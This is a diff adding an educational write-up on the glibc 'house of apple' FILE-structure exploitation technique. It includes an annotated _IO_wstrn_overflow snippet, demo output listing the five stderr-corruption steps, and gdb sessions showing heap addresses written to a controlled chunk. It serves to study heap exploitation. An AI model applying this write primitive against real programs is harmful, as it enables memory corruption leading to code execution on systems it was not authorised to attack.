@@ -1043,10 +1043,156 @@ void _IO_vtable_check(struct _IO_jump_t *vtable) {
 
 
 
+```c
+static wint_t _IO_wstrn_overflow (FILE *fp, wint_t c)
+{
+    _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;
+
+    // Key Check: if this passes, we write to memory!
+    if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
+    {
+        // VULNERABILITY: Writes heap address to controlled location!
+        // overflow_buf is at fp + 0xf0
+
+        fp->_wide_data->_IO_write_base = snf->overflow_buf;   // [_wide_data+0x18
+]
+        fp->_wide_data->_IO_read_base = snf->overflow_buf;    // [_wide_data+0x10
+]
+        fp->_wide_data->_IO_read_ptr = snf->overflow_buf;     // [_wide_data+0x00
+]
+        fp->_wide_data->_IO_read_end = snf->overflow_buf + N; // [_wide_data+0x08
+]
+    }
+
+    // Additional writes
+    fp->_wide_data->_IO_write_ptr = snf->overflow_buf;  // [_wide_data+0x20]
+    fp->_wide_data->_IO_write_end = snf->overflow_buf;  // [_wide_data+0x28]
+
+    return c;
+}
+```
+
+**IMPACT:** By controlling `fp->_wide_data`, we control WHERE these heap addresses are written!
+
+
+### Demo Program Output
+
+```
+[*] allocate a 0x100 chunk
+===========================old value=======================
+[0x2a410310]: 0x1122334455667788  0x1122334455667788
+[0x2a410320]: 0x1122334455667788  0x1122334455667788
+[0x2a410330]: 0x1122334455667788  0x1122334455667788
+[0x2a410340]: 0x1122334455667788  0x1122334455667788
+===========================old value=======================
+
+[*] puts address: 0x7fd0ca691cc0
+[*] stderr->_IO_write_ptr address: 0x7fd0ca82b478
+[*] stderr->_flags2 address: 0x7fd0ca82b4c4
+[*] stderr->_wide_data address: 0x7fd0ca82b4f0
+[*] stderr->vtable address: 0x7fd0ca82b528
+[*] _IO_wstrn_jumps address: 0x7fd0ca826b90
+
+[+] step 1: change stderr->_IO_write_ptr to -1
+[+] step 2: change stderr->_flags2 to 8
+[+] step 3: replace stderr->_wide_data with the allocated chunk
+[+] step 4: replace stderr->vtable with _IO_wstrn_jumps
+[+] step 5: call fcloseall and trigger house of apple
+
+===========================new value=======================
+[0x2a410310]: 0x00007fd0ca82b770  0x00007fd0ca82b870
+[0x2a410320]: 0x00007fd0ca82b770  0x00007fd0ca82b770
+[0x2a410330]: 0x00007fd0ca82b770  0x00007fd0ca82b770
+[0x2a410340]: 0x00007fd0ca82b770  0x00007fd0ca82b870
+===========================new value=======================
+```
 
 
 
+| Phase | Memory @ 0x2a410310 | Explanation |
+|-------|---------------------|-------------|
+| BEFORE | 0x1122334455667788 | Controlled fill value |
+| AFTER | 0x00007fd0ca82b770 | stderr->overflow_buf address! |
 
+**This demonstrates:** We can write a known address (overflow_buf = heap/libc addr) to ANY memory location we control via `_wide_data` :)
+
+
+#### Step 1: Set Breakpoint Before fcloseall()
+
+```gdb
+gdb ./house_of_apple
+break fcloseall
+run
+```
+
+#### Step 2: Examine Hijacked stderr Structure
+
+```gdb
+# Check stderr location
+p stderr
+# $1 = (struct _IO_FILE *) 0x7ffff7e2b4a0 <_IO_2_1_stderr_>
+
+# Examine critical members
+x/gx (stderr + 0x28)  # _IO_write_ptr (should be -1)
+x/gx (stderr + 0x74)  # _flags2 (should be 8)
+x/gx (stderr + 0xa0)  # _wide_data (should point to our chunk)
+x/gx (stderr + 0xd8)  # vtable (should be _IO_wstrn_jumps)
+```
+
+**Expected Output:**
+```
+_IO_write_ptr:  0xffffffffffffffff  (-1)
+_flags2:        0x0000000000000008  (wide mode enabled)
+_wide_data:     0x0000000000405310  (our controlled chunk!)
+vtable:         0x00007ffff7e26b90  (_IO_wstrn_jumps)
+```
+
+#### Step 3: Examine Target Chunk BEFORE Attack
+
+```gdb
+# Our chunk that _wide_data points to
+x/16gx 0x405310
+```
+
+**Output:**
+```
+0x405310: 0x1122334455667788  0x1122334455667788
+0x405320: 0x1122334455667788  0x1122334455667788
+0x405330: 0x1122334455667788  0x1122334455667788
+0x405340: 0x1122334455667788  0x1122334455667788
+```
+
+#### Step 4: Continue and Break After _IO_wstrn_overflow
+
+```gdb
+break _IO_wstrn_overflow
+continue
+
+# Inside _IO_wstrn_overflow, examine:
+print/x $rdi              # fp (our fake _IO_FILE)
+print/x $rdi + 0xf0       # overflow_buf address
+x/gx $rdi + 0xa0          # fp->_wide_data (our target chunk)
+```
+
+#### Step 5: Examine Target Chunk AFTER Attack
+
+```gdb
+finish  # Return from _IO_wstrn_overflow
+x/16gx 0x405310  # Check our chunk again
+```
+
+**Output:**
+```
+0x405310: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!
+0x405320: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!
+0x405330: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!
+0x405340: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!
+```
+
+### SUM FACTZ
+
+1. **Before:** Chunk filled with `0x1122334455667788`
+2. **After:** Chunk filled with `0x00007ffff7e2b770` (overflow_buf address)
 
 
 
